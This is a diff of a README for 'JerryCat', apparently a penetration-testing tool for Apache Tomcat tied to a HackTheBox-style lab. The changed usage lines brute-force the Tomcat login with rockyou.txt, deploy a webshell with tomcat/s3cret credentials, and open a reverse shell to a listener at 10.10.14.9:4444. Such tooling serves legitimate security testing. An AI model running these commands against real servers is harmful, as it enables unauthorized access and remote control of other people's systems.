@@ -23,26 +23,31 @@
 
 Clone & install dependencies
 ```sh
-$ git clone https://github.com/TheF0rceAwak5ns/JerryCat.git && cd JerryCat && pip install -r requirements.txt
+git clone https://github.com/TheF0rceAwak5ns/JerryCat.git && cd JerryCat && pip install -r requirements.txt
 ```
 
 ## Usage - Unauthenticated attack 
 
 ### Brute Force
+**without** a user list
 ```sh
-$ python3 jerrycat.py brute http://10.10.10.95:8080/ -w /user/share/wordlists/rockyou.txt
+python3 jerrycat.py brute http://10.10.10.95:8080/ -P /user/share/wordlists/rockyou.txt
+```
+**with** a user list
+```sh
+python3 jerrycat.py brute http://10.10.10.95:8080/ -U /path/to/user/list -P /user/share/wordlists/rockyou.txt
 ```
 
 ## Usage - Authenticated attack
 
 ### Webshell
 ```sh
-$ python3 jerrycat.py exec http://10.10.10.95:8080/ -u tomcat -p s3cret
+python3 jerrycat.py exec http://10.10.10.95:8080/ -u tomcat -p s3cret
 ```
 
 ### Reverse shell
 ```sh
-$ python3 talace.py reverse http://10.10.10.95:8080/ -u tomcat -p s3cret --lhost 10.10.14.9 --lport 4444
+python3 jerrycat.py reverse http://10.10.10.95:8080/ -u tomcat -p s3cret --lhost 10.10.14.9 --lport 4444
 ```
 
 
